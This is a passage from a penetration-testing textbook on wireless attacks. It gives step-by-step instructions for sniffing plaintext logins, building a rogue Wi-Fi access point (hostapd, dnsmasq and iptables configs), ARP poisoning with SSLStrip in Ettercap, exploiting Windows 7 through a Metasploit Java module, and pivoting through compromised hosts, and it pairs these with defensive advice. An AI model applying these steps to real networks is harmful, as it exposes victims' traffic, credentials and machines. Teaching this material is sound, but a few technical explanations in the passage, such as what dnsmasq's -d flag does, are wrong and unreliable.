By now, you should be aware that unencrypted Wi-Fi communication can be accessed by anybody, putting your data at risk. Have you ever used a public wireless network, such as one provided by Starbucks or a hotel? Have you ever considered who else might be linked to your network and listening in on your communications? Is that not terrifying?

It requires very little to no prior experience! Anyone may view unencrypted traffic with surprising ease. In this demonstration, let us see how to sniff your unencrypted communication in detail. This presentation will show why it is critical to always connect through a secure connection.

1.  Navigate to `Applications` | `Sniffing & Spoofing` | `Wireshark`, as shown in *[Figure 7.6](#c07.xhtml#fig7_6):*
    
    ![](images/Figure-7.6.jpg)
    
    **Figure 7.6:** Wireshark application
    
    You can also open Wireshark by entering `sudo wireshark` in a terminal window.
    
2.  *[Figure 7.7](#c07.xhtml#fig7_7)* is how the Wireshark graphical interface should look: 
    
    ![](images/Figure-7.7.jpg)
    
    **Figure 7.7:** Wireshark GUI
    
3.  Then, navigate to `Capture` | `Options...`, as shown in *[Figure 7.8](#c07.xhtml#fig7_8):*
    
    ![](images/Figure-7.8.jpg)
    
    **Figure 7.8:** Wireshark capture interfaces
    
4.  We have chosen eth0 for this demonstration. For some of you, this may be wlan0 or `wlan1`. Check the box and click on `Start`, as shown in *[Figure 7.9](#c07.xhtml#fig7_9):*
    
    ![](images/Figure-7.9.jpg)
    
    **Figure 7.9:** Wireshark eth0 interface
    
5.  You should see Wireshark beginning to capture network traffic, as shown in *[Figure 7.10](#c07.xhtml#fig7_10):*
    
    ![](images/Figure-7.10.jpg)
    
    **Figure 7.10:** Wireshark eth0 interface packets
    
6.  In this demonstration, we will be filtering HTTP and press *Enter*, as shown in *[Figure 7.11](#c07.xhtml#fig7_11)*: 
    
    ![](images/Figure-7.11.jpg)
    
    **Figure 7.11:** Wireshark HTTP filter
    
7.  Use the HTTP protocol on the browser to log in to the following website: **[http://testphp.vulnweb.com/login.php](http://testphp.vulnweb.com/login.php)**
    
    Refer to *[Figure 7.12](#c07.xhtml#fig7_12)*:
    
    ![](images/Figure-7.13.jpg)
    
    **Figure 7.12:** Website login
    
    To log in, enter username` test` and password `test`.
    
8.  In Wireshark, you should see a lot of different HTTP packets. Right-click on one of them and select Follow, then TCP Stream, as shown in *[Figure 7.13](#c07.xhtml#fig7_13)*: 
    
    ![](images/Figure-7.13.jpg)
    
    **Figure 7.13:** HTTP follow the TCP stream
    
9.  It should display the HTTP request with the username and password in plain text, as shown in *[Figure 7.14](#c07.xhtml#fig7_14):*
    
    ![](images/Figure-7.14.jpg)
    
    **Figure 7.14:** HTTP request
    

You must use the HTTPS protocol to make this connection safe and for a different connection, such as telnet. SSH-2 is the only option. SSH-1 has security flaws and is vulnerable to man-in-the-middle attacks. SSH-1 is no longer supported and should be avoided at all costs. Make sure your sshd config file is up to date, that you have changed the default SSH port, that you have limited users’ SSH access, that you have configured the IDL logout timeout interval, that you have disabled root login, and that you have set a warning banner based on your legal terms and legal notice details. Passwords and passwords for SSH should be strong. One cannot emphasize how critical this is.

# [Honeypot attacking](#toc.xhtml#s123a)

Wireless networks are becoming significantly larger in terms of bandwidth and range as technology advances. A wireless honeypot can be simply set up by a hacker to entice victims into what they assume is a secure wireless network. What is a wireless honeypot, and how does it work? **A wireless honeypot** is a device that is set up as an access point that has the same SSID as another access point in the area, as well as a proxy set up to point to the attacker’s computer.

If a user connects to a honeypot, the attacker can filter or monitor all their network activity, potentially resulting in a man-in-the-middle attack. Any unencrypted traffic within that connection, such as e-mail, instant messaging, FTP, and telnet sessions, would be visible to the attacker. Refer to *[Figure 7.15](#c07.xhtml#fig7_15)*:

![](images/Figure-7.15.jpg)

**Figure 7.15:** Unencrypted connection

The client is more than likely to view the attacker’s high-power gain antenna at the top of the wireless list for available wireless networks if the attacker has one. Another thing to keep in mind is that most Microsoft Windows operating systems are set up to connect to a wireless network automatically, which might be problematic if a honeypot with an identical SSID and password is nearby. This feature can be turned off.

# [Protecting yourself from a honeypot or man-in-the-middle attack](#toc.xhtml#s124a)

Simply not using wireless is one of the simplest methods to defend yourself from a honeypot attack, as shown in *[Figure 7.16](#c07.xhtml#fig7_16)*. What if your company requires wireless access? Profiles should be created on BYOD devices to allow only trusted wireless networks to connect to the client’s devices. Use a 3G/4G or wired connection. What if you still require wireless access? **Wireless Intrusion Prevention Systems** (**WIPS**) can detect rogue access points using both software and hardware:

![](images/Figure-7.16.jpg)

**Figure 7.16:** Man in the middle attack

The SSID, channel, signal strength, and MAC address are used by WIPS to identify these access points. There is a probability that the AP is a honeypot if the criteria do not match. What happens if the hacker uses the same SSID and channel as you? The signal strength will then be used by the WIPS. The signal intensity can help establish whether an AP is real.

**KFSensor** is a honeypot **intrusion detection system** (**IDS**) for Windows. It works as a honeypot, attracting and detecting hackers, worms, rogues, and flaws. It can deflect attacks by functioning as a decoy, adding an extra layer of defense. The KFSensor Interface is shown in *[Figure 7.17](#c07.xhtml#fig7_17)*:

![](images/Figure-7.17.jpg)

**Figure 7.17:** KFSensor interface

You can download a 30-day trial from **[http://www.keyfocus.net/kfsensor/download/](http://www.keyfocus.net/kfsensor/download/)**.

# [How to start a fake access point (fake Wi-Fi)](#toc.xhtml#s125a)

Untrusted Wi-Fi networks, as you may know, can be quite harmful if you join them. If you are in a strange place and happen to be connected to an open network, your data will be visible to the person in charge of the access point, regardless of what device you are using. Not only that but also by hooking you up with a malicious Web page or a backdoor, the person in charge can have complete control over your device.

There are numerous ways to accomplish this. You can send the connected user to a malicious website that you control and use to hook their devices. Using python MITM scripts on connected devices, you can also run and execute backdoors. Without appearing suspicious, you can even replace the download files that the connected users request on the fly.

Let us look at how to start a fake AP:

1.  First, we will need to update Kali Linux to the latest version and install the required packages, as shown in *[Figure 7.18](#c07.xhtml#fig7_18)*: 
    
    ` apt-get update`
    
    ` apt-get install hostapd dnsmasq apache2`
    
    ![](images/Figure-7.18.jpg)
    
    **Figure 7.18:** Packages installing
    
2.  We need to put the wireless card in monitor mode to allow us to sniff the packets in and around the network. You can use the method shown in *[Figure 7.19](#c07.xhtml#fig7_19)*: 
    
    `ifconfig wlan0 down`
    
    `iwconfig wlan0 mode monitor`
    
    `ifconfig wlan0 up`
    
    ![](images/Figure-7.19.jpg)
    
    **Figure 7.19:** Wireless card settings
    
3.  Or if that did not work, you can use the method shown in *[Figure 7.20](#c07.xhtml#fig7_20)*: 
    
    ` airmon-ng start wlan0`
    
    ![](images/Figure-7.20.jpg)
    
    **Figure 7.20:** airmon-ng command
    
4.  To make things organized and easier to work with, we will make a new directory in root and call it `fap` or a fake access point. Refer to *[Figure 7.21](#c07.xhtml#fig7_21)*: 
    
    `mkdir /root/fap`
    
    `cd /root/fap`
    
    ![](images/Figure-7.21.jpg)
    
    **Figure 7.21:** mkdir command
    
5.  Once we are in the`/root/fap` that we created, we will now set up a new hostapd configuration file and write instructions inside, as shown in *[Figure 7.22](#c07.xhtml#fig7_22)*. Hostapd (Host access point daemon) is a software access point that lets the user use his/her wireless adapter to broadcast several access points at the same time. 
    
    ` nano hostapd.conf`
    
    `nano`: is a command-line text editor included in most Linux installations.
    
    `hostapd.conf`: is the name of the configuration file that we created.
    
    Now, inside `hostapd.conf`, we need to set up instruction orders for it:
    
    `interface=wlan0`
    
    `driver=nl80211`
    
    `ssid=Free-Wi-Fi`
    
    `hw_mode=g`
    
    `channel=1`
    
    `macaddr_acl=0`
    
    `ignore_broadcast_ssid=0`
    
    After writing these instructions, press *Ctrl* + *X*, then *Y*, and then *Enter*. Now, we are all set for `hostapd.conf`.
    
    *   `interface`: The name of the wireless adapter that we are using in monitor mode.
    *   `driver`: The supported driver for hostapd.
    *   `ssid`: The broadcasted Wi-Fi name.
    *   `hw_mode=g`: Simply instruct it to use the 2.4 GHz band.
    *   `channel`: The channel number to use for the fake access point.
    *   `macaddr_acl=0`: Tells `hostapd` not to use MAC filtering. \[macaddr\_acl=1\] tells it to use MAC filtering.
    *   `ignore_broadcast_ssid=0`: To make the fake access point visible and not hidden.
    
    Refer to *[Figure 7.22](#c07.xhtml#fig7_22):*
    
    ![](images/Figure-7.22.jpg)
    
    **Figure 7.22:** Nano command
    
6.  Start the fake access point by doing: 
    
    ` hostapd hostapd.conf`
    
    You will notice that our access point will appear as an open Wi-Fi network. Now, open a new terminal window without closing the previous one. In the new terminal window, navigate back to the fap directory by doing the following:
    
    ` cd /root/fap`
    
    Refer to *[Figure 7.23](#c07.xhtml#fig7_23)*:
    
    ![](images/Figure-7.23.jpg)
    
    **Figure 7.23:** hostapd command
    
7.  We will be using dnsmasq for this step. Dnsmasq is a **Dynamic Host Configuration Protocol** (**DHCP**) server that is used to resolve DNS requests from or to a machine and also acts as a DHCP server to allocate IP addresses to the clients. It is fast and serves a great purpose that fits our needs. We will create a configuration file for dnsmasq and put some instructions in it, just like what we did previously with hostapd. To create the file: 
    
    ` nano dnsmasq.conf`
    
    Add these instructions inside:
    
    `interface=wlan0`
    
    `dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h`
    
    `dhcp-option=3, 192.168.1.1`
    
    `dhcp-option=6, 192.168.1.1`
    
    `server=8.8.8.8`
    
    `log-queries`
    
    `log-dhcp`
    
    `listen-address=127.0.0.1`
    
    *   `dhcp-range`: IP address range for the connected network clients. 12h is the number of hours until the lease expires.
    *   `dhcp-option=3`: Gateway IP for the networks.
    *   `dhcp-option=6`: For DNS Server followed by IP address
    *   `server`**:** DNS server’s address
    *   `log-queries`: Log the results of DNS queries handled by dnsmasq.
    *   `log-dhcp`: Log all the options sent to DHCP clients and the tags used to determine them.
    *   `listen-address`: Links the DHCP to the local IP address, which is 127.0.0.1.
    
    Press *Ctrl* + *X*, then *Y*, and then *Enter*. Now, we are all set for `dnsmasq.conf`. Refer to *[Figure 7.24](#c07.xhtml#fig7_24)*:
    
    ![](images/Figure-7.24.jpg)
    
    **Figure 7.24:** Nano dnsmasq.conf command
    
8.  Now, we need to assign the interface a network gateway and netmask and then add the routing table. Refer to *[Figure 7.25](#c07.xhtml#fig7_25):*
    
    `ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0`
    
    `route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1`
    
    Start the DNS server by doing:
    
    ` dnsmasq -C dnsmasq.conf -d`
    
    *   `dnsmasq -C`**:** Specifies a different configuration file.
    *   `-d`**:** Tells it to keep the user id without changing it.
    
    ![](images/Figure-7.25.jpg)
    
    **Figure 7.25:** dnsmasq command
    
9.  To provide the users with internet access, we need to forward traffic from `eth0`, the virtual wireless adapter that is connected to the internet, to `wlan0mon`. This will help you perform various attacks that can give you complete access to the user’s device. If you do not want the users to have internet access, skip this step. 
    
    `iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE`
    
    `iptables --append FORWARD --in-interface wlan0 -j ACCEPT`
    
    **First command**: Interface name that is used to forward traffic from.
    
    **Second command**: Interface name to receive the packets or the interface that is being forwarded to.
    
    Now, execute this command to enable IP forwarding:
    
    ` echo 1 > /proc/sys/net/ipv4/ip_forward`
    
    Refer to *[Figure 7.26](#c07.xhtml#fig7_26)*:
    
    ![](images/Figure-7.26.jpg)
    
    **Figure 7.26:** iptables command
    
10.  Test out your fake access point by playing the victim. Connect to your network and access any website you like; you should be able to see all the packets transmitted on the fly in the terminal. Hostapd will show the mac address as soon as a device has connected to the network. Refer to *[Figure 7.27](#c07.xhtml#fig7_27)*: 
     
     ![](images/Figure-7.27.jpg)
     
     **Figure 7.27:** Fake Wi-Fi
     
     On the other terminal window where dnsmasq is running, you will find out what the device is trying to access in detail. For this example, the user is accessing google.com, as shown in *[Figure 7.28](#c07.xhtml#fig7_28):*
     
     ![](images/Figure-7.28.jpg)
     
     **Figure 7.28:** Victim is accessing google.com
     

This shows how powerful a fake access point can be. Once you get your targets connected, you will have many attacks available that could eventually control the user’s device.

# [Preventing threats](#toc.xhtml#s126a)

So, even if the next hotel stay is merely flooded with kittens on each Web page redirection, you are completely aware that it could be dangerous. The good news is that we can still defend ourselves against honeypots and rogue access points. The following are a few of them:

*   **Turn off Wi-Fi**: The simplest solution to ensure your security is to turn off Wi-Fi. You are decreasing your security risk of these assaults by not using Wi-Fi.
*   **Avoid connecting to open Wi-Fi networks at all costs**: Free Internet is appealing, but what if someone is intercepting all network traffic? Do not use open Wi-Fi networks if you do not have to.
*   **Always make sure to use HTTPs links, not HTTP:** Only download from HTTPs pages.
*   **Establish a safe VPN connection**: Always use a secure VPN connection if an open network is your only option.

# [Conclusion](#toc.xhtml#s127a)

This was a fantastic chapter! We went over a lot of stuff. Let us look back at what you have learned so far. In this chapter, you learned how to capture unencrypted traffic and learned about honeypot attacks and methods, as well as how to use hostapd and dnsmasq to create a fake access point and how to protect yourself from threats.

You will learn how to intercept encrypted network traffic and about man-in-the-middle attacks in the upcoming chapter.

# [Questions](#toc.xhtml#s128a)

1.  Mention the client-side attacks.
2.  What is the meaning of Honeypot?
3.  How do you create a Fake Access Point in detail?
4.  How safe yourself from a fake access point?

# [CHAPTER 8](#toc.xhtml#c08)

# [Advanced Wireless Attacks](#toc.xhtml#c08)

# [Introduction](#toc.xhtml#s129a)

As a penetration tester, it is important to know the advanced attacks a hacker can do, even if you might not check or demonstrate them during a penetration test. This chapter demonstrates how a hacker might launch advanced attacks using wireless access as a starting point.

In this chapter, we will look at how we can use what we have learned so far to carry out advanced attacks. We will concentrate on the **man-in-the-middle** (**MITM**) attack, which requires a certain level of ability and practice to execute well. Once we have done that, we will use this MITM attack as a springboard for more advanced attacks like eavesdropping and session hijacking. Then, we will use Metasploit to exploit the victim. Finally, we will list actions to prevent these threats.

# [Structure](#toc.xhtml#s130a)

The following topics will be covered in this chapter:

*   Capturing unencrypted traffic
*   MITM attack
*   Metasploit
*   Preventions

# [Objectives](#toc.xhtml#s131a)

In this chapter, you will learn how to conduct advanced attacks using wireless, where you will create a setup for a MITM attack over wireless and then use it to eavesdrop on the victim’s traffic. Then, you will use the same setup to hijack the application layer of the victim (Web traffic, to be specific) using a DNS poisoning attack and how to use Metasploit. Finally, you will learn how to prevent these threats.

# [Capturing unencrypted traffic](#toc.xhtml#s132a)

We know that anyone connected to the same wireless network can read unencrypted wireless traffic in plain text, as shown in *[Figure 8.1](#c08.xhtml#fig8_1)*. Your e-mail, instant messages, FTP files, telnet connections, HTTP sessions, and other data may be hacked. What is the mechanism behind this? When a user browses a website using HTTP, the data they send is not encrypted from beginning to end; thus, it can be intercepted and recorded by anyone on the same network:

![](images/Figure-8.1.jpg)

**Figure 8.1:** Unncrypted connection

Wireshark is a network analyzer that allows you to examine and save live network packets. Wireshark is compatible with Windows, Mac OS X, Linux, and Unix. If a person runs Wireshark on a network, they can observe what websites people visit, what files are being moved, what instant messages are being sent, and much more.

There are several network services and public networks that are vulnerable to network sniffing. Anyone with the necessary abilities and Wireshark knowledge can quickly breach your accounts.

Always check the following to keep safe:

*   Use WPA or WPA2 encryption.
*   Always use HTTPS on public networks.
*   Use SSH or encrypted e-mail for file transfers.
*   Use a VPN when on public networks.
*   Use a password manager to log in to websites.

# [Man-in-the-middle attacks](#toc.xhtml#s133a)

You have probably heard of the monkey in the middle, but what about the man in the center? A **man-in-the-middle** (**MITM**) attack occurs when a user’s data is intercepted by a network. On the network, a malicious user acts as a router, capturing all network traffic. This covers things such as e-mails, logins, chat messages, and more. Refer to *[Figure 8.2](#c08.xhtml#fig8_2)*:

![](images/Figure-8.2.jpg)

**Figure 8.2:** MITM attack

This demonstration is solely meant to be used as a teaching tool. Hacking to improve security is a valuable talent to have. In most countries, engaging in malicious activity on an unauthorized network without permission is considered a felony. We will use our own computer and network in the next demonstration.

1.  To get started, open a Terminal and type, as shown in *[Figure 8.3](#c08.xhtml#fig8_3)*: 
    
    ` mousepad /etc/ettercap/etter.conf`
    
    **The Ettercap tool is one of the MITM tools with basic and reliable features, has a built-in-sniffer, supports DNS Spoofing Plugin, among others and Supports custom filters.**
    
    ![](images/Figure-8.3.jpg)
    
    **Figure 8.3:** Open etter.conf file
    
2.  With `etter.conf` opened, look for the words highlighted, as shown in *[Figure 8.4](#c08.xhtml#fig8_4)*: 
    
    ![](images/Figure-8.4.jpg)
    
    **Figure 8.4:** etter.conf file
    
    You will need to replace the highlighted code with *[Figure 8.5](#c08.xhtml#fig8_5)*:
    
    ![](images/Figure-8.5.jpg)
    
    **Figure 8.5:** etter.conf file parameters
    
3.  Click on `Search` and then on `Find`. Type `iptables` and click on the `Find` button, as shown in *[Figure 8.6](#c08.xhtml#fig8_6)*: 
    
    ![](images/Figure-8.6.jpg)
    
    **Figure 8.6:** iptables search
    
    The result should look like as shown in *[Figure 8.7](#c08.xhtml#fig8_7)*:
    
    ![](images/Figure-8.7.jpg)
    
    **Figure 8.7:** iptables search results
    
    You will need to uncomment two of the lines to look like as shown in *[Figure 8.8](#c08.xhtml#fig8_8)*:
    
    ![](images/Figure-8.8.jpg)
    
    **Figure 8.8:** iptables uncomment commands
    
4.  Click on `Search` and then on `Find`. Type `ip6tables` and click on the `Find` button, as shown in *[Figure 8.9](#c08.xhtml#fig8_9):*
    
    ![](images/Figure-8.9.jpg)
    
    **Figure 8.9:** iptables search
    
    The result should look like as shown in *[Figure 8.10](#c08.xhtml#fig8_10)*:
    
    ![](images/Figure-8.10.jpg)
    
    **Figure 8.10:** iptables search results
    
    You will need to uncomment two of the lines to look like as shown in *[Figure 8.11](#c08.xhtml#fig8_11)*:
    
    ![](images/Figure-8.11.jpg)
    
    **Figure 8.11:** iptables uncomment commands
    
5.  Start `Ettercap-gtk` by opening a Terminal and typing `ettercap –G`, as shown in *[Figure 8.12](#c08.xhtml#fig8_12)*: 
    
    ![](images/Figure-8.12.jpg)
    
    **Figure 8.12:** Ettercap GUI
    
6.  When `Ettercap` opens, select `Sniffing at startup` and select `Primary Interface` eth0, then press `Accept` to start Ettercap as shown in *[Figure 8.13](#c08.xhtml#fig8_13)*: 
    
    ![](images/Figure-8.13.jpg)
    
    **Figure 8.13:** Ettercap select the primary interface
    
7.  Click on `Hosts` and then select `Scan for hosts`, as shown in *[Figure 8.14](#c08.xhtml#fig8_14)*: 
    
    ![](images/Figure-8.14.jpg)
    
    **Figure 8.14:** Scan for hosts
    
8.  In the command box, you should see `hosts added to the host list`. Click on `Hosts` and then select `Hosts List`, as shown in *[Figure 8.15](#c08.xhtml#fig8_15)*: 
    
    ![](images/Figure-8.15.jpg)
    
    **Figure 8.15:** Hosts list
    
9.  Select the IP address of the router and then click on the `Add to Target 1` button, as shown in *[Figure 8.16](#c08.xhtml#fig8_16)*: 
    
    ![](images/Figure-8.16.jpg)
    
    **Figure 8.16:** Router IP add to Target 1
    
10.  Select the IP address of the victim and then click on the **Add to Target 2** button, as shown in *[Figure 8.17](#c08.xhtml#fig8_17)*: 
     
     ![](images/Figure-8.17.jpg)
     
     **Figure 8.17:** Victim IP add to Target 2
     
11.  Click on the `Mitm` menu and then select `Arp poisoning`, as shown in *[Figure 8.18](#c08.xhtml#fig8_18)*: 
     
     ![](images/Figure-8.18.jpg)
     
     **Figure 8.18:** Mitm Arp poisoning
     
12.  When you receive a prompt, check the box next to `Sniff remote connections` and click on `OK`, as shown in *[Figure 8.19](#c08.xhtml#fig8_19)*: 
     
     ![](images/Figure-8.19.jpg)
     
     **Figure 8.19:** Sniff remote connections
     
13.  Now, open `Wireshark` to sniff victim traffic. Then select interface `eth0`, as shown in *[Figure 8.20](#c08.xhtml#fig8_20)*: 
     
     ![](images/Figure-8.20.jpg)
     
     **Figure 8.20:** Wireshark
     
14.  After selecting the `eth0` interface in the Wireshark program using `http` filter, as shown in *[Figure 8.21](#c08.xhtml#fig8_21):*
     
     ![](images/Figure-8.21.jpg)
     
     **Figure 8.21:** Wireshark HTTP filer
     
15.  In the victim machine, open the browser and enter the following URL: **[http://testphp.vulnweb.com/login.php](http://testphp.vulnweb.com/login.php)**, as shown in *[Figure 8.22](#c08.xhtml#fig8_22)*: 
     
     ![](images/Figure-8.22.jpg)
     
     **Figure 8.22:** testphp.vulnweb.com website
     
     Enter username **test** and password **test**.
     
16.  Check victim traffic in Wireshark, as shown in *[Figure 8.23](#c08.xhtml#fig8_23)*: 
     
     ![](images/Figure-8.23.jpg)
     
     **Figure 8.23:** Sniffing victim traffic
     

We used it in this example HTTP protocol, but in the real world, the HTTPs protocol is used to secure communication. In this case, as an attacker, what would you do? The attacker will apply **SSLStrip** Concept, as shown in *[Figure 8.24](#c08.xhtml#fig8_24),* where **SSLStrip** is a type of MITM attack that forces users to communicate using an HTTP protocol instead of HTTPS in which an attacker can view all SSL traffic in plain text. **HTTP Strict Transport Security (HSTS)** is a security protection mechanism that protects you from this kind of threat:

![](images/Figure-8.24.jpg)

**Figure 8.24:** SSLStrip concept

To use SSLStrip concept, we will activate SSLStrip plugin in the Ettercap program. On the menu bar, click `Plugins`, then `Manage the plugins`, then double click on `sslstrip` plugin. There is a (`*`) sign on the left side once it is active, as shown in *[Figure 8.25](#c08.xhtml#fig8_25)*:

![](images/Figure-8.25.jpg)

**Figure 8.25:** SSLStrip plugin

Congratulations! You have successfully conducted a full MITM attack.

To stop the attack, select `Stop sniffing`, as shown in *[Figure 8.26](#c08.xhtml#fig8_26)*:

![](images/Figure-8.26.jpg)

**Figure 8.26:** Stop sniffing

Ettercap will transmit an ARP packet after terminating the attack, and the network will revert to normal in a few minutes. Use ARP detection tools like XArp or Snort to protect yourself from such assaults. Assigning static ARP entries can also aid in the prevention of an attack. It will inform the attacker that the MAC address of the router is fixed and cannot be modified. As a result, all ARP packets supplied by the attacker will be ignored.

# [Metasploit](#toc.xhtml#s134a)

For penetration testers and IDS developers, Metasploit is the most well-known open-source tool. The Metasploit framework is a security exploit and script database. It is one of the most widely used open-source tools for writing and running exploit code on target systems.

We will use a Java vulnerability to hack Windows 7 in the next demonstration. This vulnerability will allow the attacker to collect system information or hashdump, take a picture from a Webcam, give administrator access, construct and launch executables, create backdoors, and so on. Let us get started!

1.  Open a terminal and type `msfconsole`, as shown in *[Figure 8.27](#c08.xhtml#fig8_27)*: 
    
    ![](images/Figure-8.27.jpg)
    
    **Figure 8.27:** msfconsole command
    
2.  Now, type search `java_jre17_provider_skeleton`, as shown in *[Figure 8.28](#c08.xhtml#fig8_28)*: 
    
    ![](images/Figure-8.28.jpg)
    
    **Figure 8.28:** Search the command
    
3.  Then type use `exploit/multi/browser/java_jre17_provider_skeleton`, as shown in *[Figure 8.29](#c08.xhtml#fig8_29)*: 
    
    ![](images/Figure-8.29.jpg)
    
    **Figure 8.29:** Use the command
    
4.  Now, type **show options**, as shown in *[Figure 8.30](#c08.xhtml#fig8_30)*: 
    
    ![](images/Figure-8.30.jpg)
    
    **Figure 8.30:** Show options command
    
5.  Let us configure three modules options: `SRVHOST`, `SRVPPORT`, and `URIPATH`, as shown in *[Figure 8.31](#c08.xhtml#fig8_31)*: 
    
    ![](images/Figure-8.31.jpg)
    
    **Figure 8.31:** Set command
    
    Replace `SRVHOST` (`192.168.1.128`) with your Kali Linux IP address.
    
6.  Now, let us start the exploit, as shown in *[Figure 8.32](#c08.xhtml#fig8_32)*: 
    
    ![](images/Figure-8.32.jpg)
    
    **Figure 8.32:** Exploit command
    
7.  Now, let us go to the Windows 7 machine (the victim) and from Internet Explorer point to our Kali Machine, as shown in *[Figure 8.33](#c08.xhtml#fig8_33)*: 
    
    ![](images/Figure-8.33.jpg)
    
    **Figure 8.33:** Windows 7 machine
    
    Just leave the browser there. Then in the Metasploit console, you will see the following *[Figure 8.34](#c08.xhtml#fig8_34)*:
    
    ![](images/Figure-8.34.jpg)
    
    **Figure 8.34:** Metasploit Console 7
    
8.  At this point, you will see a session connected to the Windows 7 Machine, as shown in *[Figure 8.35](#c08.xhtml#fig8_35):*
    
    ![](images/Figure-8.35.jpg)
    
    **Figure 8.35:** Interactive shell on Windows 7 machine
    
9.  To connect to the session, we can run the following and check the system info, as shown in *[Figure 8.36](#c08.xhtml#fig8_36)*: 
    
    ![](images/Figure-8.36.jpg)
    
    **Figure 8.36:** Session 1 command
    
10.  Now, let us start up a shell and run some commands remotely, as shown in *[Figure 8.37](#c08.xhtml#fig8_37)*: 
     
     ![](images/Figure-8.37.jpg)
     
     **Figure 8.37:** Shell command
     

Congratulations! The Windows 7 operating system has been successfully exploited by you.

Please consider the following to defend yourself from such attacks:

*   Disable Java if you are not going to use it.
*   Increase Java’s security level.
*   Allow only trusted sources from Java.
*   Visit only trusted websites and remote servers.
*   Enable Windows Defender or other security software.
*   Use HTTPs Protocol and VPN to protect from all MITM attacks where everything will be encrypted.

# [Preventions](#toc.xhtml#s135a)

A summary of all the preventions addressed in this chapter is as follows:

*   Use SSH or encrypted e-mail for file transfers.
*   Use a VPN when on public networks.
*   Use HTTPs Protocol when on public networks.
*   Use a password manager to log in to websites.
*   Disable Java if you are not going to use it.
*   Increase Java’s security level.
*   Allow only trusted sources from Java.
*   Visit only trusted websites and remote servers.
*   Enable Windows Defender or other security software.
*   Download and install software updates.
*   Download and install the operating system update.

This, once again, is dependent on the user’s computer activity. If the user connects to a public network, they may become a target of a MITM attack. A vulnerability attack could be launched against a person who is pirating software or movies.

# [Conclusion](#toc.xhtml#s136a)

The practical demonstrations in this chapter should have opened your eyes and broadened your feeling of security, allowing you to better protect yourself and others from threats. We addressed the following topics in this chapter:

*   How to capture unencrypted traffic with protocols such as HTTP, FTP, and Telnet
*   How to protect yourself using encryption
*   What man-in-the-middle attacks are
*   A demonstration of a man-in-the-middle attack
*   How to protect yourself from man-in-the-middle attacks
*   What Metasploit is
*   A demonstration of Metasploit
*   How to protect yourself from Metasploit attacks

You will learn how to pivot through a local network to reach other systems and devices in the next chapter. We will also be documenting and cleaning up after ourselves. Look forward to seeing you in *[Chapter 9: Wireless Post-Exploitation](#c09.xhtml)*.

# [Questions](#toc.xhtml#s137a)

1.  How to protect yourself from man-in-the-middle attacks?
2.  What is Metasploit?
3.  What is SSLStrip?

# [CHAPTER 9](#toc.xhtml#c09)

# [Wireless Post-Exploitation](#toc.xhtml#c09)

# [Introduction](#toc.xhtml#s138a)

Welcome! In the last chapter, we compromised a single network target. So, what happens next, you might wonder? The attacker will certainly go further into the network to target internal workstations and servers.

The idea of Défense-in-Depth, which has a significant place in the field of information technology, necessitates the creation of an n-layered security architecture to defend key services. Consider this in terms of corporate networks: vital systems cannot be connected to other systems. In this chapter, we will look at how attackers can use pivoting tactics to gain access to hidden networks that are not accessible in the first place.

# [Structure](#toc.xhtml#s139a)

The following topics will be covered in this chapter:

*   What is routing?
*   What is pivoting?
*   Compromise first pivot and port forwarding  
    *   Nmap via pivoting
    *   Port forwarding
*   SSH brute-force over pivoting
*   Gaining access to the second pivot
*   Double pivoting
*   Mitigations

# [Objectives](#toc.xhtml#s140a)

In this chapter, you will be able to learn how to use first and double pivoting to investigate hidden networks and the mitigations methods.

# [What is routing?](#toc.xhtml#s141a)

Routing is the process of defining how devices in various networks communicate with one another. Routing is frequently done with the help of devices known as *routers*. The routing table is used by the routers to route network packages to their intended destinations. Routing can be done on any computer with the operating system loaded on it, not just network devices like routers. Refer to *[Figure 9.1](#c09.xhtml#fig9_1)*:

![](images/Figure-9.1.jpg)

**Figure 9.1:** Routing

According to the example in the previous figure, a routing table record is required to communicate successfully between the `192.168.1.0/24` and `192.168.10.0/24` networks. Access is made from the `192.168.1.0/24` source to the `192.168.10.0/24` destination according to the router’s rule.

The following is the adventure of a network package:

1.  Is the IP address to be accessed on the local network?  
    1.  If yes, reach the destination.
    2.  If not, send it to the gateway.
2.  The router examines its own routing table after receiving the package.  
    1.  Do you have a routing rule in place for the target IP address or network?  
        1.  If yes, send the package to the target or the destination.
        2.  If not, send it to the gateway.
3.  Other routers go through a similar procedure.
4.  Finally, the package reaches the router in charge of the institution’s internet exit. The package is then uploaded to the internet.

# [What is pivoting?](#toc.xhtml#s142a)

Essentially, it is the practice of leveraging compromised computers to gain access to networks that we would not otherwise have access to. If a computer with access to the network is compromised, network isolation will be worthless. This approach allows an attacker to get access to secret networks by routing to compromised systems. The pivot is used to transfer all requests to the newly found network. It is like a kind of tunnel. Refer to *[Figure 9.2](#c09.xhtml#fig9_2)*:

![](images/Figure-9.2.jpg)

**Figure 9.2:** Pivoting

The device with two NICs has access to both the `192.168.1.0/24` and `192.168.10.0/24` networks, as shown in the topology. Unless a routing rule is defined, there is no access between these two networks under normal circumstances. The authorized user, who is using a computer with two NIC cards, must access some services in the DMZ, according to this topology.

# [Compromise first pivot and port forwarding](#toc.xhtml#s143a)

The meterpreter shell obtained in the system named as RD is likewise connected to the DMZ network, according to our attack scenario. With the information-gathering procedure, it is later discovered that the target has two NICs.

**The environment’s router does not route between networks.**

*[Figure 9.3](#c09.xhtml#fig9_3)* illustrates the first pivot:

![](images/Figure-9.3.jpg)

**Figure 9.3:** First pivot

*[Figure 9.4](#c09.xhtml#fig9_4)* illustrates the `Meterpreter_1`:

![](images/Figure-9.4.jpg)

**Figure 9.4:** Meterpreter\_1

*[Figure 9.5](#c09.xhtml#fig9_5)* illustrates the `Meterpreter_2`:

![](images/Figure-9.5.jpg)

**Figure 9.5:** Meterpreter\_2

According to our scenario, an attacker who gains access to the RD system will wish to use the second NIC (7.7.7.0/24) to access the network. To do this activity, the attacker needs first to define the routing rule on RD.

With Metasploit, this is simple. To build the routing rule using the current meterpreter session, do the following command. Refer to *[Figure 9.6](#c09.xhtml#fig9_6)*:

![](images/Figure-9.6.jpg)

**Figure 9.6:** Meterpreter\_3

The 7.7.7.0/24 network can be accessed in the Metasploit framework if the meterpreter session with ID value 2 operates, according to the established rule, as shown in *[Figure 9.7](#c09.xhtml#fig9_7)*.

The IP addresses of the JC system are then discovered using post modules like ARP scanners. Another computer discovered in the hidden network –7.7.7.20– is JC.

Refer to *[Figure 9.7](#c09.xhtml#fig9_7)*:

![](images/Figure-9.7.jpg)

**Figure 9.7:** Meterpreter\_4

